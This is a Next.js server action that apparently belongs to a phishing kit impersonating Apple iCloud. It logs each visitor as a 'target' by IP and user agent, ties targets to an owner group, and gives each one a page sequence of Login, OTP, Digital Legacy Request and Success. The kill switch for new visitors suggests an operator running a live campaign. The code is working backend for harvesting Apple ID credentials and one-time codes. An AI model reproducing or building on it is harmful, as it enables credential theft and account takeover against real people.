'use server'
import { headers } from 'next/headers'
import { prisma } from "@/app/server/db/prisma";
import { getClientIp } from "@/app/server/utils/client-ip";

export default async function createTarget(ua, clientIpFromApi = null) {
  const userAgent = ua ? String(ua) : null;
  const headersList = await headers();
  const ipFromHeaders = getClientIp(headersList);
  const clientIp = clientIpFromApi?.trim() || null;
  const ip = clientIp || ipFromHeaders;

  const isConnectionError = (err) =>
    err?.code === 'ECONNREFUSED' ||
    err?.message?.includes('connect') ||
    err?.message?.includes('database');

  try {
    if (!process.env.DATABASE_URL) {
      console.warn('DATABASE_URL not set; using dev fallback target id')
      return { id: 'dev-target-no-db' }
    }
    const intakePageName = process.env.INTAKE_PAGE_NAME ?? "iCloud";
    const domainSlug = intakePageName.toLowerCase().replace(/\s+/g, "-").replace(/[^a-z0-9-]/g, "");
    const domain = await prisma.domains.findFirst({ where: { slug: domainSlug } });
    const allowNewVisitors = domain?.allow_new_visitors ?? true;
    if (!allowNewVisitors) {
      return { id: null, closed: true };
    }

    // Reuse existing session for same IP to prevent multiple visitor sessions per IP
    if (ip) {
      const existing = await prisma.targets.findFirst({
        where: {
          ip,
          status: { in: ["pending", "active"] },
        },
        orderBy: { created_at: "desc" },
        select: { id: true },
      });
      if (existing) {
        return { id: existing.id };
      }
    }

    const data = await prisma.targets.create({
      data: {
        status: "pending",
        intake_page_name: intakePageName,
        useragent: userAgent,
        owner_group_id: process.env.OWNER_GROUP_ID ?? null,
        ip,
      },
      select: { id: true },
    });

    await prisma.intake_states.create({
      data: { target_id: data.id, gameplan_step: 0 },
    });
    await prisma.gameplans.create({
      data: {
        target_id: data.id,
        pages: [
          { name: "Login" },
          { name: "OTP" },
          { name: "Digital Legacy Request" },
          { name: "Success" },
        ],
      },
    });

    return { id: data.id };
  } catch (error) {
    if (isConnectionError(error)) {
      console.warn('PostgreSQL unreachable; using dev fallback target id. Error:', error?.message || error)
      return { id: 'dev-target-no-db' }
    }
    console.error('Error creating target:', error)
    throw new Error('Failed to create target')
  }
}